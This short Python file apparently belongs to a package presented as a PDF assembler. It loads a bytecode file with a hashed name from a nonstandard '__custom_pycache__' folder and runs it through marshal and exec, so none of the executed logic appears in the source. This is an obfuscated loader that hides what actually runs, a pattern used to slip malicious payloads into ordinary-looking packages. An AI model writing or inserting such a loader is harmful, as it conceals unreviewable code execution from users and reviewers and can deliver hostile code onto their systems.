
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'PdfAssembler_b17d4a60323b4c0bbc290e1cce693738.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
